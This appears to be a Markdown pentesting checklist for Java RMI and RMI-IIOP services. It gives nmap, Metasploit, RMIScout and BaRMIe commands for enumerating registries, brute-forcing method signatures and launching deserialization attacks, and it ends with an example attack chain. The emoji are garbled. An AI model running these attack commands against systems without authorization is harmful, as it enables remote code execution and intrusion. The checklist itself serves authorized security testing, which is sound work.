# ‚òï Java RMI / RMI-IIOP Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Java RMI (ports 1098, 1099, 1050), I realistically expect to find:

- [ ] Registry contents with bound object names
- [ ] Exposed remote methods that accept serialized input
- [ ] Insecure Java deserialization leading to RCE
- [ ] Service banner revealing Java version or framework
- [ ] Vulnerable default configurations or endpoints

---

## ‚úÖ Java RMI Pentest Checklist

- [ ] **Service Detection & Banner Grabbing**
  - Identify the RMI service and version.
    ```
    nmap -sV -p1099,1098,1050 <IP>
    ```
  - Dump registry contents and check for known vulns.
    ```
    nmap --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1099 <IP>
    ```

- [ ] **Manual Registry Enumeration**
  - Check for bound objects and remote methods.
    ```
    rmidump <IP> 1099
    ```

- [ ] **Metasploit Enumeration**
  - Use Metasploit auxiliary scanners.
    ```
    use auxiliary/scanner/misc/java_rmi_server
    use auxiliary/gather/java_rmi_registry
    ```

- [ ] **Metasploit Exploitation**
  - Attempt deserialization attacks.
    ```
    use exploit/multi/misc/java_rmi_server
    ```

- [ ] **Brute-Forcing Method Signatures**
  - Use RMIScout to identify available methods safely.
    ```
    python rmiscout.py --target <IP>:1099 --enum
    ```
  - Provide custom wordlists for better guessing.
    ```
    --methods methods.txt --prototypes prototypes.txt
    ```

- [ ] **BaRMIe for Enumeration & Exploitation**
  - Enumerate and attack RMI endpoints.
    ```
    java -jar BaRMIe_v1.01.jar -enum <IP> <PORT>
    java -jar BaRMIe_v1.01.jar -attack <IP> <PORT>
    ```

---

## ‚úÖ RMI-IIOP Pentest Checklist

- [ ] **Service Identification**
  - Look for Java RMI-IIOP on default or adjacent ports.
  - Confirm via banners or nmap output.

- [ ] **Brute-Force Method Signatures**
  - Aware of risk of triggering real methods.
  - RMIScout for IIOP signatures.
    ```
    python rmiscout.py --target <IP>:<PORT> --iiop
    ```
  - Avoid parameter-less methods unless explicitly safe.
    ```
    --allow-unsafe
    ```

---

## ‚úÖ Exploitation Tools

- **BaRMIe**
  - RMI enumeration and exploitation framework.
    ```
    https://github.com/NickstaDB/BaRMIe
    ```
- **RMIScout**
  - Safer signature brute-forcing with wordlists.
    ```
    https://github.com/BishopFox/rmiscout
    ```
- **sjet**
  - Advanced Java RMI and JMX exploitation toolkit.
    ```
    https://github.com/siberas/sjet
    ```

---

## ‚úÖ Example Attack Chain

1Ô∏è‚É£ Enumerate registry contents.

```
nmap --script rmi-dumpregistry -p 1099 <IP>
```

2Ô∏è‚É£ Brute-force method signatures.

```
python rmiscout.py --target <IP>:1099 --enum
```

3Ô∏è‚É£ Exploit with known gadget chains.

```
java -jar BaRMIe_v1.01.jar -attack <IP> 1099
```








